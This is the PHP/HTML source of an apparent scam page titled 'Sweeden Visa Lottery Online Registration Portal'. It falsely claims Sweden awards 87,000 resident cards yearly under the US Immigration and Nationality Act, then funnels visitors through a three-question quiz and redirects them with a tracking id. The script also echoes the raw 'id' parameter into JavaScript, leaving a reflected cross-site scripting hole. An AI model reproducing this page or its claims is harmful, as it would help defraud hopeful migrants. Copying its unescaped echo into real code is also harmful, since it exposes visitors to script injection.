<?php
require_once('../functions.php');
if(isset($_GET['id']) and $_GET['id'] !='' ){
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>EventUp - Event and Conference Template</title>

    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">

    <link rel="stylesheet" type="text/css" href="assets/fonts/line-icons.css">

    <link rel="stylesheet" type="text/css" href="assets/css/slicknav.css">

    <link rel="stylesheet" type="text/css" href="assets/css/nivo-lightbox.css">

    <link rel="stylesheet" type="text/css" href="assets/css/color-switcher.css">

    <link rel="stylesheet" type="text/css" href="assets/css/main.css">

    <link rel="stylesheet" type="text/css" href="assets/css/responsive.css">
</head>

<body>

    <header id="header-wrap" >


        <div id="hero-area" class="hero-area-bg" style="height: 600px; background: url(assets/img/t1.jpg) no-repeat; background-size: 100% 100%;" >
            <div class="overlay"></div>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-lg-9 col-sm-12">
                        <div class="contents text-center">

                            <h2 class="head-title">SWEEDISH RESIDENT CARD VISA LOTTERY
                            </h2>

                        </div>
                    </div>
                </div>
            </div>
        </div>

    </header>


    <section id="about" class="section-padding">
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-md-12 col-xs-12">
                    <div class="img-thumb">
                        <img class="img-fluid" src="assets/img/t3.jpg" alt="">
                    </div>
                </div>
                <div class="col-lg-6 col-md-12 col-xs-12">
                    <div class="about-content">
                        <div>
                            <div class="about-text">
                                <h2>SWEEDEN VISA LOTTERY ONLINE REGISTRATION PORTAL
                                </h2>
                                <p>Each year, 87,000 immigrant visas (Resident Cards) are awarded in a lottery held by the SWEEDEN IMMIGRATION DEPARTMENT. The resident card lottery is an official program pursuant to Sec. 203 of the Immigration and Nationality Act. If you receive a Resident Card through this program, you and your family will be able to live and work permanently in the Sweeden!
                                    <br>
                                    Foreigners interested in immigrating legally to Sweeden, must submit their applications starting 1st October at noon and until 31th December 2021
                                </p>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>


    <form method="post" action='#'>
        <section id="contact-map1" class="">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="section-title-header text-center">
                            <h2 class="section-title wow fadeInUp" data-wow-delay="0.2s">Question 1 of 3: How Well Do You Speak English?
                            </h2>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-lg-8 col-md-12 col-xs-12">
                        <div class="container-form wow fadeInLeft" data-wow-delay="0.2s">
                            <div class="form-wrapper">
                                    <div class="row">

                                        <div class='col-md-12 form-line'>
                                            <div class='form-submit'>
                                                <input value='Fluent' name='q11' class='btn btn-common' id='form-submit' onclick="question1('Fluent')"><i class='fa fa-paper-plane' aria-hidden='true'></i>
                                                <div id='msgSubmit' class='h3 text-center hidden'></div>
                                            </div>
                                        </div>


                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Conversational" name='q12' class="btn btn-common" id="form-submit" onclick="question1('Conversational')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Only Native Language" name='q13'  class="btn btn-common" id="form-submit" onclick="question1('Only Native Language')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                    </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="contact-map2" class="" style="display: none; transition: none; transform: none;">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="section-title-header text-center">
                            <h2 class="section-title wow fadeInUp" data-wow-delay="0.2s"> Question 2 of 3 questions: Marital Status?
                            </h2>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-lg-8 col-md-12 col-xs-12">
                        <div class="container-form wow fadeInLeft" data-wow-delay="0.2s">
                            <div class="form-wrapper">


                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Single" name='q2' class="btn btn-common" id="form-submit" onclick="question2('Single')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Married" name='q2' class="btn btn-common" id="form-submit" onclick="question2('Married')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Divorced" name='q2' class="btn btn-common" id="form-submit" onclick="question2('Divorced')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                    </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="contact-map3" class="section-padding" style="display: none;">
            <div class="container">
                <div class="row">

                    <div class="col-12">
                        <div class="section-title-header text-center">
                            <h2 class="section-title wow fadeInUp" data-wow-delay="0.2s">Question 3 of 3 questions: What is Your Employment Status?
                            </h2>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-center">
                    <div class="col-lg-8 col-md-12 col-xs-12">
                        <div class="container-form wow fadeInLeft" data-wow-delay="0.2s">
                            <div class="form-wrapper">

                                    <div class="row">

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Student" name='q3' class="btn btn-common" onclick="question3('Student')" id="form-submit"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Employeed" name='q3' class="btn btn-common" id="form-submit" onclick="question3('Employeed')"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                        <div class="col-md-12 form-line">
                                            <div class="form-submit">
                                                <input value="Unemployeed" name='q3' class="btn btn-common" onclick="question3('Unemployeed')" id="form-submit"><i
                                                        class="fa fa-paper-plane" aria-hidden="true"></i>
                                                <div id="msgSubmit" class="h3 text-center hidden"></div>
                                            </div>
                                        </div>

                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>


    </form>

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="assets/js/jquery-min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- <script src="assets/js/color-switcher.js"></script> -->
    <script src="assets/js/jquery.countdown.min.js"></script>
    <script src="assets/js/waypoints.min.js"></script>
    <script src="assets/js/jquery.counterup.min.js"></script>
    <script src="assets/js/jquery.nav.js"></script>
    <script src="assets/js/jquery.slicknav.js"></script>
    <script src="assets/js/nivo-lightbox.js"></script>
    <script src="assets/js/video.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/form-validator.min.js"></script>
    <script src="assets/js/contact-form-script.min.js"></script>

    <script type='text/javascript'>
        var q1= '';
        var q2= '';
        var q3= '';
        function question1(name)
        {
            document.getElementById('contact-map1').style.display = 'none';
            document.getElementById('contact-map2').style.display = 'block';
            q1 = name;
        }

        function question2(name)
        {
            document.getElementById('contact-map2').style.display = 'none';
            document.getElementById('contact-map3').style.display = 'block';
            q2 = name;
        }
        function question3(name)
        {
            document.getElementById('contact-map3').style.display = 'none';
            //document.getElementById('contact-map4').style.display = 'block';
            q3 = name;
            console.log(q1 + ' ' +  q2 + ' ' + q3);
            location.href='index4.php?user=<?php echo $_GET['id'] ?>&q1='+q1+'&q2='+q2+'&q3='+q3+'';
            <?php
            $q11 = '<script>document.write(q1);</script>';
            $q22 = '<script>document.write(q2);</script>';
            $q33 = '<script>document.write(q3);</script>';
            ?>
        }


        var i = 0;
        function share1()
        {
            i++;
            alert(i);
            if(i == 5)
            {
                document.getElementById('web1').disabled = false;
            }
        }
    </script>
</body>

</html>

<?php
}else{
    header('location:index.php');
}
?>
